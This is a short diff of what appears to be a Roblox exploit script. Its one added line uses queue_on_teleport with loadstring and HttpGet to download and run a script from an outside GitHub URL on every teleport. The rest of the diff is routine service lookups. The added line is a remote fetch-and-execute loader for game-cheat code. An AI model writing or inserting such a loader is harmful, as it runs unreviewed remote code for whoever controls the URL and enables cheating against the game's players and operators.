@@ -1,3 +1,4 @@
+queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Rx1m/Pravite/refs/heads/main/Test"))()')
 local plrs = game:GetService("Players")
 local ts = game:GetService("TweenService")
 local uis = game:GetService("UserInputService")
